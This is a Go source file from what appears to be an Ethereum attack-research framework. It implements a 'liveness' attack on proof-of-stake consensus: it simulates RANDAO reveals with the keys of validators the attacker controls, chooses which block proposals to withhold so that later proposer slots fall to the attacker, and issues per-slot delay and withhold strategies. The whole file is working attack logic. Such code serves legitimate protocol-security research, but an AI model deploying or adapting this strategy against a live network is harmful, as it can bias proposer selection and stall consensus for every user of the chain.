package liveness

import (
	"context"
	"encoding/hex"
	"github.com/ethereum/go-ethereum/common/hexutil"
	"github.com/google/uuid"
	"github.com/prysmaticlabs/prysm/v5/cache/lru"
	"github.com/prysmaticlabs/prysm/v5/consensus-types/primitives"
	log "github.com/sirupsen/logrus"
	"github.com/tsinghua-cel/attacker-service/common"
	"github.com/tsinghua-cel/attacker-service/disguisedRandao"
	"github.com/tsinghua-cel/attacker-service/types"
	"strconv"
	"time"
)

type Instance struct {
	b     types.ServiceBackend
	param types.LibraryParams
}

func (o *Instance) Name() string {
	return "liveness"
}

func (o *Instance) Description() string {
	// implement attack https://ethresear.ch/t/liveness-attack-in-ethereum-pos-protocol-using-randao-manipulation/22241
	desc_eng := `liveness attack.`
	return desc_eng
}

func toInt(s string) int {
	i, err := strconv.Atoi(s)
	if err != nil {
		return 999999
	}
	return i
}

func (o *Instance) Run(ctx context.Context, params types.LibraryParams, feedbacker types.FeedBacker) {
	olog := log.WithField("name", o.Name())
	olog.Info("start to run strategy")
	attacker := params.Attacker
	o.b = attacker.GetBackend()
	o.param = params

	t := time.NewTicker(time.Second)
	defer t.Stop()

	history := make(map[int]bool)
	epochDutyCache := lru.New(10)
	var getCacheDuty = func(epoch int64) (duties []types.ProposerDuty) {
		if d, exist := epochDutyCache.Get(epoch); exist {
			return d.([]types.ProposerDuty)
		} else {
			return nil
		}
	}
	var setCacheDuty = func(epoch int64, duties []types.ProposerDuty) {
		epochDutyCache.Add(epoch, duties)
	}
	triggerring := false
	triggeredEpoch := 0 // record the epoch that strategy is triggered.
	for {
		select {
		case <-ctx.Done():
			log.WithField("name", o.Name()).Info("stop to run strategy")
			return
		case <-t.C:
			// 如果当前epoch的第一个slot是attacker, 并且下一个epoch 的第一个slot是attacker,
			// 那么当前epoch 为 epoch 1， 后续一共三个epoch.
			// 当前epoch的第一个slot delay 8s.
			state, err := o.b.GetBeaconState("head")
			if err != nil {
				olog.WithField("error", err).Error("failed to get beacon state")
				continue
			}
			slot, _ := state.Slot()
			epoch := common.SlotToEpoch(int64(slot))
			if history[int(epoch)] == true {
				continue
			}
			nextEpoch := epoch + 1

			var curDuty = getCacheDuty(epoch)
			var nextDuty = getCacheDuty(nextEpoch)
			if curDuty == nil {
				if duty, err := attacker.GetEpochDutiesFromAttack(epoch); err != nil {
					continue
				} else {
					setCacheDuty(epoch, duty)
					curDuty = duty
					olog.WithFields(log.Fields{
						"epoch": epoch,
						"duty":  len(duty),
					}).Info("get epoch duties")
				}
			}
			if nextDuty == nil {
				if duty, err := attacker.GetEpochDutiesFromAttack(nextEpoch); err != nil {
					continue
				} else {
					setCacheDuty(nextEpoch, duty)
					nextDuty = duty

					olog.WithFields(log.Fields{
						"epoch": nextEpoch,
						"duty":  len(duty),
					}).Info("get epoch duties")
				}
			}

			for {
				if !triggerring {
					// generate a simple strategy for nextDuty first.
					slotsStrategies := genSimpleStrategy(int(nextEpoch), params.FilterHackerDuties(nextDuty))
					strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
					if err = attacker.UpdateStrategy(strategy); err != nil {
						olog.WithField("error", err).Error("failed to update strategy simple")
					} else {
						olog.WithFields(log.Fields{
							"epoch":    nextEpoch,
							"strategy": strategy,
						}).Debug("update strategy successfully")
					}

					if params.IsHackValidator(toInt(nextDuty[0].ValidatorIndex)) && params.IsHackValidator(toInt(curDuty[0].ValidatorIndex)) &&
						o.attackerInTailN(params.FilterHackerDuties(curDuty), 5) {
						triggerring = true
						triggeredEpoch = int(epoch)
						olog.WithFields(log.Fields{
							"current epoch": epoch,
							"next epoch":    epoch + 1,
						}).Debug("strategy trigger")
						continue
					}

					history[int(epoch)] = true
					break

				} else {
					offset := epoch - int64(triggeredEpoch) + 1
					if offset == 1 {
						{
							// update current epoch strategy.
							slotsStrategies := genStrategyForTrigger1(int(epoch), params.FilterHackerDuties(curDuty))
							strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    epoch,
									"strategy": strategy,
									"trigger":  triggerring,
									"offset":   1,
								}).Debug("update triggering strategy successfully")
							}
						}
						{
							// generate next epoch strategy without bestMaskDuty.
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger2(int(nextEpoch), params.FilterHackerDuties(nextDuty), types.ProposerDuty{})
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"strategy": strategy,
									"trigger":  triggerring,
									"offset":   2,
								}).Debug("pre update triggering strategy successfully")
							}
						}
						history[int(epoch)] = true
						break
					} else if offset == 2 {
						olog.WithFields(log.Fields{
							"epoch":        epoch,
							"len(curduty)": len(curDuty),
						}).Debug("before ComputeBestMaskDuty")
						// compute bestMaskDuty and update current epoch strategy.
						bestMask, err := o.ComputeBestMaskDuty(uint64(slot), curDuty)
						if err != nil {
							olog.WithField("error", err).Error("failed to compute best mask duty")
							break
						}
						{
							// update current epoch strategy.
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger2(int(epoch), params.FilterHackerDuties(curDuty), bestMask)
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"strategy": strategy,
									"trigger":  triggerring,
									"offset":   2,
								}).Debug("update triggering strategy successfully")
							}
						}
						{
							// generate next epoch strategy without bestMaskDuty.
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger2(int(nextEpoch), params.FilterHackerDuties(nextDuty), types.ProposerDuty{})
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"strategy": strategy,
									"trigger":  triggerring,
									"offset":   3,
								}).Debug("pre update triggering strategy successfully")
							}
						}
						history[int(epoch)] = true
						break
					} else if offset == 3 {
						olog.WithFields(log.Fields{
							"epoch":        epoch,
							"len(curduty)": len(curDuty),
						}).Debug("before ComputeBestMaskDuty")
						// compute bestMaskDuty and update current epoch strategy.
						bestMask, err := o.ComputeBestMaskDuty(uint64(slot), curDuty)
						if err != nil {
							olog.WithField("error", err).Error("failed to compute best mask duty")
							break
						}
						{
							// update current epoch strategy.
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger3(int(epoch), params.FilterHackerDuties(curDuty), bestMask)
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    epoch,
									"strategy": strategy,
									"trigger":  triggerring,
									"offset":   3,
								}).Debug("update triggering strategy successfully")
							}
						}
						{
							// set triggering to false
							triggerring = false
							// generate a simple strategy for nextDuty first.
							slotsStrategies := genSimpleStrategy(int(nextEpoch), params.FilterHackerDuties(nextDuty))
							strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update strategy simple")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"strategy": strategy,
								}).Debug("update strategy successfully")
							}

						}
						history[int(epoch)] = true
						break
					}
				}
			}
		}
	}
}

type BestMaskDutyInfo struct {
	FirstIsAttack  bool
	AttackersCount int
	duty           types.ProposerDuty
	proposers      []primitives.ValidatorIndex
	seed           []byte
}

func (info BestMaskDutyInfo) BetterThan(other BestMaskDutyInfo) bool {
	// if attackers count is equal, prefer the one with firstIsAttack.
	if info.FirstIsAttack && !other.FirstIsAttack {
		return true
	} else if !info.FirstIsAttack && other.FirstIsAttack {
		return false
	}

	// prefer the one with more attackers.
	if info.AttackersCount > other.AttackersCount {
		return true
	} else if info.AttackersCount < other.AttackersCount {
		return false
	}

	// if both are equal, prefer the one with smaller duty slot.
	return toInt(info.duty.Slot) < toInt(other.duty.Slot)
}

func (o *Instance) ComputeBestMaskDuty(slot uint64, currentDuty []types.ProposerDuty) (types.ProposerDuty, error) {
	//strSlot := strconv.FormatUint(uint64(slot), 10)
	currentState, err := o.b.GetBeaconState("head")
	if err != nil {
		log.WithFields(log.Fields{
			"paramSlot": slot,
			"err":       err,
		}).Error("failed to get beacon state")
		return types.ProposerDuty{}, err
	}
	stateSlot, err := currentState.Slot()
	if err != nil {
		log.WithFields(log.Fields{
			"paramSlot": slot,
			"err":       err,
		}).Error("failed to get beacon state slot")
		return types.ProposerDuty{}, err
	}
	log.WithFields(log.Fields{
		"stateSlot":    stateSlot,
		"paramSlot":    slot,
		"currentEpoch": common.SlotToEpoch(int64(stateSlot)),
		"paramEpoch":   common.SlotToEpoch(int64(slot)),
	}).Debug("get beacon state to compute best mask duty")

	mostate, err := disguisedRandao.InitMoState(currentState)
	if err != nil {
		log.WithFields(log.Fields{
			"err": err,
		}).Error("failed to init mo state")
		return types.ProposerDuty{}, err
	}
	currentEpoch := common.SlotToEpoch(int64(stateSlot))
	next2Epoch := currentEpoch + 2
	// append all attacker validators' duties.
	allAttackerDuties := make([]types.ProposerDuty, 0)
	for _, duty := range currentDuty {
		// filter out old duties.
		if toInt(duty.Slot) <= int(stateSlot) {
			continue
		}
		if o.param.IsHackValidator(toInt(duty.ValidatorIndex)) {
			allAttackerDuties = append(allAttackerDuties, duty)
		}
	}

	var bestMaskInfo = BestMaskDutyInfo{}

	for maskIdx := 0; maskIdx < len(allAttackerDuties); maskIdx++ {
		// loop mask one attack validator to proposer block.
		maskDuty := allAttackerDuties[maskIdx]
		if toInt(maskDuty.Slot) < int(stateSlot) {
			continue
		}

		cState := mostate.Clone()
		for i := 0; i < len(allAttackerDuties); i++ {
			duty := allAttackerDuties[i]
			// if current duty is earlier than current slot, skip it.
			// if the duty is the masked one, skip it.
			if toInt(duty.Slot) < int(slot) || i == maskIdx {
				continue
			}
			// simulate validator generate a randao_reveal and update to state.
			pubkey, privk, err := o.b.GetValidatorsKeys(toInt(allAttackerDuties[i].ValidatorIndex))
			if err != nil {
				log.WithFields(log.Fields{
					"validator index": allAttackerDuties[i].ValidatorIndex,
				}).Error("failed to get validator keys when preparing strategy")
				return types.ProposerDuty{}, err
			}

			// generate a randao reveal.
			randaoReveal, err := cState.GenerateRandaoReveal(privk, pubkey, primitives.Epoch(currentEpoch))
			if err != nil {
				log.WithFields(log.Fields{
					"validator index": allAttackerDuties[i].ValidatorIndex,
					"err":             err,
				}).Error("failed to generate randao reveal when preparing strategy")
				return types.ProposerDuty{}, err
			}

			log.WithFields(log.Fields{
				"pubkey":        pubkey,
				"randao reveal": hex.EncodeToString(randaoReveal),
				"epoch":         currentEpoch,
			}).Debug("dump validator randao reveal")

			if err = disguisedRandao.ProcessRandaoNoVerify(cState, randaoReveal, primitives.Epoch(currentEpoch)); err != nil {
				log.WithFields(log.Fields{
					"validator index": allAttackerDuties[i].ValidatorIndex,
					"err":             err,
				}).Error("failed to process randao reveal when preparing strategy")
				return types.ProposerDuty{}, err
			}
		}
		// epoch process.
		seed, proposers, err := cState.PrecomputeProposerIndices(disguisedRandao.GenValidatorIndices(0, 255),
			primitives.Epoch(next2Epoch))
		if err != nil {
			log.WithFields(log.Fields{
				"current":    currentEpoch,
				"next2epoch": next2Epoch,
				"err":        err,
			}).Error("failed to precompute proposer indices")
			return types.ProposerDuty{}, err
		}
		curMaskInfo := BestMaskDutyInfo{
			FirstIsAttack:  o.param.IsHackValidator(int(proposers[0])),
			AttackersCount: o.attackerCount(proposers),
			duty:           maskDuty,
			proposers:      proposers,
			seed:           seed,
		}
		if curMaskInfo.BetterThan(bestMaskInfo) {
			bestMaskInfo = curMaskInfo
		}
		log.WithFields(log.Fields{
			"maskDuty":      bestMaskInfo.duty,
			"computeEpoch":  next2Epoch,
			"attackerCount": bestMaskInfo.AttackersCount,
			"firstIsAttack": bestMaskInfo.FirstIsAttack,
			"proposers":     bestMaskInfo.proposers,
			"curProposers":  proposers,
		}).Debug("computing best mask duty")
	}

	log.WithFields(log.Fields{
		"maskDutySlot":  bestMaskInfo.duty.Slot,
		"computeEpoch":  next2Epoch,
		"firstIsAttack": bestMaskInfo.FirstIsAttack,
		"proposers":     bestMaskInfo.proposers,
		"seed":          hexutil.Encode(bestMaskInfo.seed),
	}).Debug("liveness attack strategy prepared final")
	return bestMaskInfo.duty, nil
}

func (o *Instance) attackerCount(vals []primitives.ValidatorIndex) int {
	var count = 0
	for i := 0; i < len(vals); i++ {
		if o.param.IsHackValidator(int(vals[i])) {
			count++
		}
	}
	return count
}

func (o *Instance) attackerInTailN(attackDuties []types.ProposerDuty, tailN int) bool {
	latest := attackDuties[len(attackDuties)-1]
	slot := toInt(latest.Slot)
	epoch := common.SlotToEpoch(int64(slot))
	epochEnd := common.EpochEnd(epoch)
	return (int(epochEnd) - tailN) <= slot
}
